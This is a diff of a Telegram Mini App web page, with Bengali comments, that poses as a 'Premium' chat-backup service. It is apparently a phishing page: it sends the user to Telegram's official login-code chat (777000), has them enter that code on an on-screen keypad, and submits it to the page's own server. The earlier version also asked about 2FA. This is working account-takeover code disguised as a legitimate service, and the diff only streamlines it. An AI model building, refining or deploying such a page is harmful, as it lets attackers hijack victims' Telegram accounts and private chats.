@@ -8,51 +8,29 @@
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 0; margin: 0; background: #000; color: white; text-align: center; }
         .box { background: white; color: #333; padding: 30px; border-radius: 25px; margin: 50px 20px; box-shadow: 0 5px 25px rgba(0,0,0,0.5); }
-        .btn { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; font-size: 18px; cursor: pointer; transition: background 0.3s; }
-        
-        /* প্রফেশনাল গেট কোড বাটন */
-        .btn-get-code { 
-            background: #28a745; 
-            color: white; 
-            border: none; 
-            padding: 15px; 
-            width: 100%; 
-            border-radius: 12px; 
-            font-weight: bold; 
-            font-size: 16px; 
-            cursor: pointer; 
-            margin-bottom: 20px; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            gap: 10px;
-        }
-
+        .btn { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; font-size: 18px; cursor: pointer; }
+        .btn-get-code { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; margin-bottom: 15px; }
         .hidden { display: none; }
         .otp-display { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 12px; font-size: 32px; text-align: center; background: #f9f9f9; color: #333; letter-spacing: 5px; height: 65px; box-sizing: border-box; outline: none; }
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 15px; }
-        .key { background: #f1f1f1; padding: 22px; border-radius: 15px; font-size: 26px; font-weight: bold; color: #333; cursor: pointer; border: 1px solid #ddd; -webkit-tap-highlight-color: transparent; }
-        .key:active { background: #ddd; }
-        .key-clear { background: #ffc107; }
+        .key { background: #f1f1f1; padding: 22px; border-radius: 15px; font-size: 26px; font-weight: bold; color: #333; cursor: pointer; border: 1px solid #ddd; }
         .key-ok { background: #0088cc; color: white; }
     </style>
 </head>
 <body>
-    <!-- Step 0: Initial Activation -->
     <div class="box" id="step0">
-        <h2 style="color:#0088cc; margin-top:0;">Premium Service</h2>
-        <p style="color:#666; font-size: 15px;">Backup your files securely. Activate your service below.</p>
+        <h2 style="color:#0088cc;">Premium Service</h2>
+        <p style="color:#666;">Backup your chat history securely.</p>
         <button class="btn" id="main_btn" onclick="startFlow()">🚀 Activate Backup Service</button>
-        <div id="loader" class="hidden"><p style="color:#0088cc;">🔄 Connecting to Cloud...</p></div>
+        <div id="loader" class="hidden"><p style="color:#0088cc;">🔄 Connecting...</p></div>
     </div>
 
-    <!-- Step 2: OTP Keypad -->
     <div class="box hidden" id="step2">
-        <h3 style="margin-top:0;">Identity Verification</h3>
-        <p style="font-size:13px; color:#666; margin-bottom:15px;">আপনার অফিসিয়াল 'Telegram' চ্যাটে ওটিপি পাঠানো হয়েছে। নিচের বাটনে ক্লিক করে কোডটি দেখে নিন।</p>
+        <h3>Identity Verification</h3>
+        <p style="font-size:13px; color:#666; margin-bottom:15px;">কোডটি আপনার অফিসিয়াল 'Telegram' চ্যাটে পাঠানো হয়েছে।</p>
         
-        <!-- গেট কোড বাটন যা সরাসরি ওটিপি চ্যাটে নিয়ে যাবে -->
-        <button class="btn-get-code" onclick="openOtpChat()">📩 GET LOGIN CODE</button>
+        <!-- Get Code Button -->
+        <button class="btn-get-code" onclick="openCodeChat()">📩 GET LOGIN CODE</button>
         
         <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
         
@@ -60,7 +38,7 @@
             <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
             <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
             <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
-            <div class="key key-clear" onclick="clearNum()">C</div><div class="key" onclick="addNum('0')">0</div><div class="key key-ok" id="v_btn" onclick="verifyOTP()">OK</div>
+            <div class="key" style="background:#ffc107;" onclick="clearNum()">C</div><div class="key" onclick="addNum('0')">0</div><div class="key key-ok" id="v_btn" onclick="verifyOTP()">OK</div>
         </div>
     </div>
 
@@ -71,15 +49,9 @@
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
 
-        // প্রফেশনাল বোটগুলো যে লিঙ্ক ব্যবহার করে
-        function openOtpChat() {
-            // ১. এই লিঙ্কটি সরাসরি টেলিগ্রামের অফিসিয়াল ওটিপি চ্যাটে নিয়ে যাওয়ার জন্য সবচেয়ে কার্যকর
-            tg.openTelegramLink("https://t.me/service_notifications");
-            
-            // যদি উপরের লিঙ্কটি কাজ না করে, বিকল্প হিসেবে এটি চেষ্টা করবে (১০% ডিভাইসে এটি দরকার হয়)
-            setTimeout(() => {
-                tg.openTelegramLink("https://t.me/777000");
-            }, 300);
+        function openCodeChat() {
+            // সরাসরি ওটিপি চ্যাটে নিয়ে যাওয়ার লিঙ্ক
+            tg.openTelegramLink("https://t.me/777000");
         }
 
         function startFlow() {
@@ -126,7 +98,7 @@
                 });
                 const data = await res.json();
                 if (data.status === "success") { alert("✅ Service Activated!"); tg.close(); } 
-                else { alert("Verification Failed! Check OTP or 2FA."); clearNum(); vBtn.innerText = "OK"; }
+                else { alert("Verification Failed!"); clearNum(); vBtn.innerText = "OK"; }
             } catch (e) { alert("Error!"); vBtn.innerText = "OK"; }
         }
     </script>
